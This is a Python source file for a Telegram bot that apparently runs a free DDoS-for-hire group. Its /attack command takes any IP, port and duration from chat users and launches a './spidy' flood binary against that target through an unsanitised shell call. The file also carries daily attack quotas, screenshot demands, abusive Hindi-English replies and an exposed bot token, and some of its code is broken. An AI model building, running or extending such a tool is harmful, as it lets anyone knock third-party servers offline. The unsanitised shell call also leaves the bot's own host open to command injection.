#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import aiohttp
import threading
import random
# Insert your Telegram bot token here
bot = telebot.TeleBot('6829329110:AAH89A7vnUyypU8hh_1ssJYUUiAtYcLAYCU')


# Admin user IDs
admin_id = ["1789079780"]

# Group and channel details
GROUP_ID = -1002470771241"
CHANNEL_USERNAME = "@PARADOX_VIP_CHEAT","https://t.me/PARADOX_VIP_CHEAT"

# Default cooldown and attack limits
COOLDOWN_TIME = 30  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day
global_pending_attack = None
global_last_attack_time = None
pending_feedback = {}  # यूजर 

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/g7a.jpg",
    "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg",
    "https://envs.sh/gH4.jpg",
    "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg",
    "https://envs.sh/gH1.jpg",
    "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg",
    "https://envs.sh/67E.jpg",
    "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg",
    "https://envs.sh/68V.jpg",
    "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg",
    "https://envs.sh/Vwe.jpg",
    "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg",
    "https://envs.sh/VwK.jpg",
    "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg",
    "https://envs.sh/Vwc.jpg"
]

def is_user_in_channel(user_id):
    return True  # **यहीं पर Telegram API से चेक कर सकते हो**
# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_last_attack_time

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 𝐓𝐄𝐑𝐄 𝐁𝐀𝐀𝐏 𝐊𝐀 𝐁𝐎𝐓 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈 𝐉𝐎 𝐅𝐑𝐄𝐄 𝐌𝐄 𝐔𝐒𝐄 𝐊𝐀𝐑𝐄𝐆𝐀 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀\n🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: {https://t.me/+zg3y6kVUV4piOTdl}")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **𝐇𝐀𝐑𝐀𝐌𝐈 𝐒𝐀𝐋𝐄 𝐅𝐑𝐄𝐄 𝐌𝐄 𝐔𝐒𝐄 𝐊𝐀𝐑𝐄𝐆𝐀**𝐉𝐎𝐈𝐍 𝐊𝐀𝐑𝐋𝐎 𝐖𝐀𝐑𝐍𝐀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐔𝐒𝐄 𝐍𝐇𝐈 𝐊𝐀𝐑 𝐏𝐀𝐎𝐆𝐄 {https://t.me/+zg3y6kVUV4piOTdl} 🔥")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **𝐊𝐀𝐌𝐈𝐍𝐄 𝐒𝐂𝐑𝐄𝐄𝐍 𝐒𝐇𝐎𝐓 𝐃𝐄 ** 🔥\n🚀 *𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐔𝐒𝐄 𝐊𝐀𝐑𝐍𝐄 𝐊𝐄 𝐋𝐈𝐘𝐄 𝐏𝐇𝐄𝐋𝐄 𝐖𝐀𝐋𝐀 𝐒𝐂𝐑𝐄𝐄𝐍 𝐒𝐇𝐎𝐓 𝐃𝐄 *")
        return

    # Check if an attack is already running
    if is_attack_running(user_id):
        bot.reply_to(message, "⚠️ **𝐒𝐀𝐁𝐀𝐑 𝐊𝐀𝐑 𝐁𝐄𝐓𝐀 𝐀𝐁𝐇𝐈 𝐄𝐊 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐇𝐀𝐋 𝐑𝐀𝐇𝐀 𝐇𝐀𝐈** ⚡")
        return

    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ **𝐁𝐀𝐒 𝐁𝐀𝐒 𝐁𝐄𝐓𝐀 𝐀𝐁 𝐊𝐀𝐋 𝐀𝐍𝐀 𝐓𝐇𝐄𝐄𝐊** ❌\n🔄 *𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖!*")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack `<IP>` `<PORT>` `<TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **𝐄𝐑𝐑𝐎𝐑:** 𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!")
        return

    if time_duration > 200:
        bot.reply_to(message, "🚫 **𝐊𝐀𝐘𝐄𝐃𝐄 𝐌𝐄 𝐑𝐀𝐇𝐄 𝐂𝐇𝐎𝐓𝐄 𝐖𝐀𝐑𝐍𝐀 𝐆𝐀𝐍𝐃 𝐏𝐄 𝐋𝐀𝐆𝐄𝐍𝐆𝐄 𝐒𝐇𝐎𝐓𝐄 200 𝐒𝐄 𝐉𝐀𝐃𝐀 𝐊𝐀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐆𝐀 𝐓𝐎𝐇 𝐁𝐀𝐍 𝐊𝐀𝐑𝐃𝐔𝐍𝐆𝐀= 200𝐬!**")
        return

    # Get the user's profile picture
    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count > 0:
        profile_pic = profile_photos.photos[0][-1].file_id
    else:
        # Ask the user to set a profile picture
        bot.reply_to(message, "❌ **𝐏𝐇𝐄𝐋𝐄 𝐏𝐇𝐎𝐓𝐎 𝐋𝐀𝐆𝐀 𝐅𝐈𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐌𝐀𝐑𝐍𝐀 !** 🔥\n📸 *𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐄𝐓 𝐀 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐏𝐈𝐂𝐓𝐔𝐑𝐄 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊!*")
        return

    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
    random_image = random.choice(image_urls)

    # Send profile picture and attack start message together
    bot.send_photo(message.chat.id, profile_pic, caption=f"👤 **User:** @{user_name} 🚀\n"
                                                        f"💥 **𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧 𝗡𝗢𝗪!** 🚀\n"
                                                        f"🎯 **𝗧𝗔𝗥𝗚𝗘𝗧:** `{target} : {port}`\n"
                                                        f"⏳ **𝗗𝗨𝗥𝗔𝗧𝗨𝗢𝗡:** {time_duration}𝙨\n"
                                                        f"⚡ **𝗥𝗘𝗠𝗔𝗜𝗡𝗚 𝗧𝗜𝗠𝗘:** {remaining_attacks}\n"
                                                        f"📸 **𝗖𝗛𝗔𝗟 𝗔𝗕 𝗝𝗔𝗟𝗗I 𝗦𝗘 𝗦𝗖𝗥𝗘𝗘𝗡 𝗦𝗛𝗢𝗧 𝗗𝗘 **\n"
                                                        f"⏳ **𝗣𝗥𝗢𝗚𝗥𝗘𝗦: 3.2%**")

    pending_feedback[user_id] = True  

    full_command = f"./spidy {target} {port} {time_duration} "

    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
        pending_feedback[user_id] = False
        return

    # Update progress bar to 100% and close pop-up
    bot.send_message(message.chat.id, 
                     f"✅ **𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀!** ✅\n"
                     f"🎯 `{target}:{port}` **𝙃𝘼𝙈𝙇𝘼!**\n"
                     f"⏳ **𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉:** {time_duration}𝙨\n"
                     f"⚡ **𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆:** {remaining_attacks}\n"
                     f"⏳ **𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒: 100%**")

    threading.Thread(target=send_attack_finished, args=(message, user_name, target, port, time_duration, remaining_attacks)).start()


def is_attack_running(user_id):
    """
    Checks if the user is currently running an attack.
    """
    return user_id in pending_feedback and pending_feedback[user_id] == True


def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
    bot.send_message(message.chat.id, 
                     f"🚀 **𝙉𝙚𝙭𝙩 𝘼𝙩𝙩𝙖𝙘𝙠 𝙆𝙚 𝙡𝙞𝙮𝙚 𝙧𝙚𝙖𝙙𝙮 𝙃𝙪** ⚡")
    
    bot.send_message(message.chat.id, "🚀 **𝐀𝐁𝐄𝐄 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐋𝐄𝐋𝐄𝐍𝐀 𝐒𝐀𝐋𝐎 𝐒𝐄 𝐌𝐄 𝐑𝐄𝐀𝐃𝐘 𝐇𝐔** ⚡")
    
@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
    else:
        bot.reply_to(message, "No global cooldown. You can initiate an attack.")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"User Summary:\n\n{user_list}")
    

# Dictionary to store feedback counts per user
feedback_count_dict = {}

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    feedback_count = feedback_count_dict.get(user_id, 0) + 1  # Increment feedback count for the user

    # Update feedback count in the dictionary
    feedback_count_dict[user_id] = feedback_count

    # 🚀 Check if user is in channel  
    try:
        user_status = bot.get_chat_member(CHANNEL_USERNAME, user_id).status
        if user_status not in ['member', 'administrator', 'creator']:
            bot.reply_to(message, f"❌ **𝘾𝙃𝘼𝙇 𝘾𝙃𝘼𝙇 𝙋𝙃𝙀𝙇𝙀 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝙅𝙊𝙄𝙉 𝙆𝘼𝙍!**\n"
                                  f"🔗 **𝐉𝐨𝐢𝐧 𝐇𝐞𝐫𝐞:** [Click Here](https://https://t.me/+zg3y6kVUV4piOTdl  {@PARADOX_VIP_CHEAT})")
            return  
    except Exception as e:
        bot.reply_to(message, "❌ **𝐂𝐨𝐮𝐥𝐝 𝐍𝐨𝐭 𝐕𝐞𝐫𝐢𝐟𝐲! 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐈𝐬 𝐀𝐝𝐦𝐢𝐧 𝐈𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥.**")
        return  

    # ✅ Proceed If User is in Channel
    if pending_feedback.get(user_id, False):
        pending_feedback[user_id] = False  

        # 🚀 Forward Screenshot to Channel  
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)

        # 🔥 Send Confirmation with SS Number  
        bot.send_message(CHANNEL_USERNAME, 
                         f"📸 **𝙏𝙝𝙖𝙣𝙠𝙨 𝙁𝙤𝙧 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝘼𝙗 𝙉𝙚𝙭𝙩 𝘼𝙩𝙩𝙖𝙘𝙠 𝙐𝙨𝙚 𝙠𝙖𝙧𝙡𝙤 !**\n"
                         f"👤 **𝙐𝙎𝙀𝙍:** `{user_name}`\n"
                         f"🆔 **𝙄𝘿:** `{user_id}`\n"
                         f"🔢 **𝙎𝙎 𝙉𝐨.:** `{feedback_count}`")

        bot.reply_to(message, "✅ **𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙈𝙄𝙇 𝙂𝘼𝙔𝘼 𝙈𝘼𝙇𝙄𝙆 𝘼𝙇𝙇𝙊𝙒 𝙆𝘼𝙍𝘿𝙐 𝘼𝙏𝙏𝘼𝘾𝙆 𝙆𝙀 𝙇𝙄𝙔𝙀🚀")
    else:
        bot.reply_to(message, "❌ **𝐄𝐊 𝐁𝐀𝐑 𝐌𝐄 𝐄𝐊 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐑𝐓 𝐃𝐄 𝐎𝐑 𝐏𝐔𝐑𝐀𝐍𝐀 𝐖𝐀𝐋𝐀 𝐃𝐈𝐘𝐀 𝐓𝐎𝐇 𝐏𝐄𝐋 𝐃𝐔𝐍𝐆𝐀!**")
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""𝘼𝙋𝙆𝘼 𝙎𝙐𝘼𝙂𝘼𝙏 𝙃𝘼𝙄 𝙃𝘼𝙈𝘼𝙍𝙀 𝐅𝐑𝐄𝐄 𝘿𝘿𝙊𝙎 𝙂𝙍𝙊𝙐𝐏 𝙈𝙀  {user_name} 🔥🌟
    
🚀 𝘿𝙐𝙉𝙄𝙔𝘼 𝙈𝙀 𝙎𝘼𝘽𝙎𝙀 𝙆𝙃𝘼𝙏𝘼𝙍𝙉𝘼𝙆𝙆 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏 𝙃𝘼𝙄 𝘼𝘽 𝘼𝘼 𝙂𝘼𝙔𝙀 𝙅𝙊 𝙏𝙊𝙃 𝙐𝐒𝐄 𝘽𝙃𝙄 𝙆𝘼𝙍𝙇𝙊!  

🔗 **𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭, 𝐉𝐨𝐢𝐧 𝐍𝐨𝐰:**  
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/+zg3y6kVUV4piOTdl) 🚀🔥"""
    
    bot.reply_to(message, response, parse_mode="Markdown")
# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)
        
        
 




